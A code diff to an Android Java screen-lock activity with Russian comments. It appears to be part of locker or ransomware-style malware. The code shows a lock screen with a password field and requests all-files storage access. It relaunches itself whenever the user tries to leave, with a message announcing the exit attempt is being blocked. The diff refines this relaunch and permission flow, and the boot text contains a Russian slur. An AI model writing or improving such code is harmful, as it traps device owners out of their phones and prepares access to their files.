@@ -28,6 +28,7 @@ public class LockActivity extends Activity {
     private Handler handler = new Handler();
     private boolean isUnlocked = false;
     private File targetDir;
+    private boolean isAnimationStarted = false;
 
     @Override
     protected void onCreate(Bundle b) {
@@ -80,46 +81,72 @@ public class LockActivity extends Activity {
 
         TextView bootText = findViewById(R.id.bootText);
         View mainBlock = findViewById(R.id.mainBlock);
+        Button grantButton = findViewById(R.id.grantButton);
 
-        bootText.setVisibility(View.VISIBLE);
-        mainBlock.setVisibility(View.GONE);
+        // Проверяем, вернулись ли мы из окна разрешений
+        boolean isReturningFromSettings = getIntent().getBooleanExtra("RETURNING_FROM_SETTINGS", false);
+        boolean isReturningFromExit = getIntent().getBooleanExtra("RETURNING_FROM_EXIT", false);
 
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                bootText.setText("P I D O R I\n[ SYSTEM INITIALIZED ]");
-                handler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        bootText.setVisibility(View.GONE);
-                        mainBlock.setVisibility(View.VISIBLE);
+        if (isReturningFromExit || isReturningFromSettings) {
+            // Пропускаем анимацию
+            bootText.setVisibility(View.GONE);
+            mainBlock.setVisibility(View.VISIBLE);
+            if (mp == null) {
+                mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
+                if (mp != null) {
+                    mp.setLooping(true);
+                    mp.start();
+                }
+            }
+            if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
+                grantButton.setVisibility(View.VISIBLE);
+            }
+            isAnimationStarted = true;
+        } else {
+            // Первый запуск (анимация)
+            bootText.setVisibility(View.VISIBLE);
+            mainBlock.setVisibility(View.GONE);
 
-                        if (mp == null) {
-                            mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
-                            if (mp != null) {
-                                mp.setLooping(true);
-                                mp.start();
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    bootText.setText("P I D O R I\n[ SYSTEM INITIALIZED ]");
+                    handler.postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            bootText.setVisibility(View.GONE);
+                            mainBlock.setVisibility(View.VISIBLE);
+
+                            if (mp == null) {
+                                mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
+                                if (mp != null) {
+                                    mp.setLooping(true);
+                                    mp.start();
+                                }
+                            }
+
+                            if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
+                                grantButton.setVisibility(View.VISIBLE);
                             }
                         }
-
-                        Button grantButton = findViewById(R.id.grantButton);
-                        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
-                            grantButton.setVisibility(View.VISIBLE);
-                        }
-                    }
-                }, 2000);
-            }
-        }, 3000);
+                    }, 2000);
+                }
+            }, 3000);
+        }
 
         EditText passwordInput = findViewById(R.id.passwordInput);
         TextView enterButton = findViewById(R.id.enterButton);
-        Button grantButton = findViewById(R.id.grantButton);
 
+        // Кнопка открывает настройки
         grantButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 if (Build.VERSION.SDK_INT >= 30) {
-                    startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
+                    // Передаем флаг, чтобы при возврате не запускалась анимация
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                    // Запоминаем, что мы ушли в настройки
+                    getIntent().putExtra("RETURNING_FROM_SETTINGS", true);
                 }
             }
         });
@@ -148,6 +175,15 @@ public class LockActivity extends Activity {
                 }
             }
         });
+    }
+
+    // Ловим возврат из окна настроек
+    @Override
+    protected void onNewIntent(Intent intent) {
+        super.onNewIntent(intent);
+        setIntent(intent);
+        // Тут можно принудительно пересоздать активити, если надо
+        recreate();
     }
 
     @Override
@@ -223,6 +259,7 @@ public class LockActivity extends Activity {
             Toast.makeText(this, "ЗАМЕЧЕНА ПОПЫТКА ВЫХОДА БЛОКИРУЮ", Toast.LENGTH_SHORT).show();
             Intent intent = new Intent(this, LockActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            intent.putExtra("RETURNING_FROM_EXIT", true);
             startActivity(intent);
         }
     }
@@ -237,4 +274,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-                        }
+            }
